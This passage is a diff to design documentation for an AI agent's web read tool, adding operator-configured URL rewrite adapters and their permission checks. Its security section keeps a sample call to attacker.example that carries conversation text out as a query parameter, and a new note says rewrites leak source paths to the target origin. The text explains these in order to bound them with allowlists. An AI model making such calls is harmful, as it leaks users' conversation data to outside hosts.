@@ -161,10 +161,74 @@ The result is otherwise the native read object — `content`, the requested and
 shown range or ranges, `nextOffset`, `truncated`, and `path` as the locator
 with its selector stripped — plus `finalUrl` and `notes` only when there is
 something to report; there is no `url`, `contentType`, `markdownTokens`,
-`realPath`, text header, or frontmatter block. The order is:
+`realPath`, text header, or frontmatter block.
+
+The web adapter stage runs after source admission (including the `read`
+permission and address checks) and before the generic ladder. `:raw` bypasses
+every adapter. `tools.webAdapters` absent means `[]` (no adapter); when
+present, the array is the exact ordered list, with no built-in entries. A URL
+accepted by an adapter's pure match is **claimed**; an unclaimed URL reaches
+the generic ladder with no adapter request and no adapter note.
+
+A rewrite entry has the shape `{ id, use: "rewrite", hosts, pathPattern?,
+target }`. `hosts` are exact canonical hostnames. `pathPattern`, when present,
+is an RE2-compatible regular expression using the same bounded matcher as
+`tools.permissions`, searched unanchored against the canonical path; anchor it
+with `^` and `$` when whole-path matching is intended. `target` is a literal
+`http` or `https` origin followed by a path/query template: `{path}` inserts
+the canonical source path as-is, and `{query}` inserts
+`encodeURIComponent` of the canonical query without `?`. Boot fails before
+serving requests for an unknown field or use, duplicate id, noncanonical host,
+invalid `pathPattern`, non-secret interpolation, or a target that is not
+`http` or `https`, has userinfo or a fragment, or has an unknown, unbalanced,
+or misplaced placeholder in the scheme, host, port, path, or query. There are
+no per-entry headers, and rewrite targets receive no credentials.
+
+The runbook example entry is:
+
+```jsonc
+{
+  "id": "x",
+  "use": "rewrite",
+  "hosts": ["x.com", "twitter.com"],
+  "pathPattern": "^/[^/]+/status/\\d+$",
+  "target": "https://x.pcstyle.dev{path}",
+}
+```
+
+Each adapter target is a derived locator admitted independently by the `read`
+group before I/O as kind `adapter`; its redirect hops are admitted under the
+same rules.
+
+Adapter requests use the generic web bounds and address pinning: a 10-second
+headers bound, the shared 30-second call deadline, a 5 MiB response and
+rendered document bound, and a 20-hop redirect bound. There is no separate
+adapter request-count cap. A rewrite target is rebuilt and revalidated per
+call, fetched once, and rendered only through negotiated/text or Readability;
+it does not run alternate, suffix, or `llms.txt` probes. A raw, challenge, or
+failed render falls through.
+
+A claimed adapter whose primary request fails falls through with
+`web adapter "<id>" fell through: <failure>`, where `<failure>` is one of
+`permission`, `address`, `status`, `rate_limit`, `transport`, `parse`, `empty`,
+`binary`, `too_large`, or `content_type`. A later request for the same
+document, or a call deadline reached after the primary request, can render the
+content that arrived and add one `<section> omitted: <failure>` note per
+missing section.
+A rendered document over 5 MiB is cut at a line boundary with
+`document truncated: too_large`.
+Adapter failures never return their response body.
+
+A successful adapter reports `method: "adapter"` and
+`adapter: { id, route, origin }`; a rewrite uses `route: "rewrite"` and its
+declared origin. Its `finalUrl` remains the source URL, and its notes say that
+the content came through the operator-configured origin.
+
+The full order is:
 
 | `method`      | Source of the content                                                                                           |
 | ------------- | --------------------------------------------------------------------------------------------------------------- |
+| `adapter`     | a configured adapter's rendered content, with structured provenance and notes                                   |
 | `negotiated`  | the first response itself: `text/markdown` or `text/plain`, returned as served                                  |
 | `alternate`   | a Markdown URL announced by a `Link` header or a head `<link rel="alternate" type="text/markdown">`             |
 | `md-suffix`   | the publisher's `.md` suffix probe: `/a/b.html` → `/a/b.html.md`, `/a/b` → `/a/b.md`, `/a/b/` → `/a/b/index.md` |
@@ -213,9 +277,10 @@ candidates; with 20 redirects that is at most 27 requests.
 ## Derived locators and permission admission
 
 A web read derives locators the model never wrote: redirect hops, an announced
-alternate, a suffix candidate, and `llms.txt` candidates. Each one is evaluated
-against the `read` permission group before its request, as if the model had
-submitted it, through the same evaluator and the same projection the call used.
+alternate, a suffix candidate, an `llms.txt` candidate, and an adapter target.
+Each one is evaluated against the `read` permission group before its request,
+as if the model had submitted it, through the same evaluator and the same
+projection the call used.
 It inherits nothing from the admitted call or from an earlier derived locator.
 
 The two forms policy sees differ, and the difference matters when you write
@@ -331,6 +396,9 @@ coexist:
 With that group, reading `https://docs.example.com/guide` is admitted, and
 reading `https://other.example/guide`, `/etc/hosts`, or `kb://SPACE/notes/a.md`
 is each rejected as `no_allow` without a fetch or a file open.
+The domain allowlist must also name each rewrite origin: allowing the source
+host does not admit the operator-declared target origin, because the target is
+a separate derived locator.
 
 What the clause matches is locator text, not an address:
 
@@ -368,6 +436,11 @@ under a whole-tool allow `read https://attacker.example/?d=<conversation text>`
 is one admitted call that carries data out of the process. The operator's
 `read` group bounds that direction too; a domain allowlist (above) is the
 mitigation, and it is only as good as the canonical text it matches.
+
+A rewrite sends the source path, and the source query when `{query}` is
+templated, to the operator-declared origin. The runbook `x.com` example leaks
+the status path to `x.pcstyle.dev`; the entry is opt-in, and the `read` policy
+is the outbound boundary.
 
 **Every request is judged at the address it can dial.** For the submitted URL
 and every hop or probe, the tool uses one system-resolver answer per host per
